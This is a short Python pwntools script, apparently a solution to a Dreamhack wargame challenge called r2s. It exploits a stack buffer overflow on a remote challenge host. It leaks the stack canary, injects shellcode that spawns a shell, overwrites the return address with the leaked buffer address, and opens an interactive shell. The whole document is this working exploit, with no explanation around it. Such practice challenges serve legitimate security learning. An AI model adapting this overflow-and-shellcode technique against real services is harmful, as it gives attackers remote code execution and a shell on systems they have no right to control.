# Name: r2s.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

HOST = "host3.dreamhack.games"
PORT = 18007

# context.log_level = "debug"
conn = remote(HOST, PORT)
# conn = process('./r2s')

conn.recvuntil(b'Address of the buf: ')
buf_address = int(conn.recvline(), base=16)
conn.recvuntil(b'Distance between buf and $rbp: ')
size = int(conn.recvline()) - 8
conn.sendlineafter(b'Input: ', b'A' * size)
conn.recvuntil(b'Your input is')
conn.recvuntil(b'\x0a')
canary = conn.recv(7)
payload = asm(shellcraft.amd64.linux.sh())
payload += asm('nop') * (size - len(payload))
payload += b'\x00' + canary + b'A' * 8 + p64(buf_address)
conn.sendlineafter(b'Input: ', payload)
conn.interactive()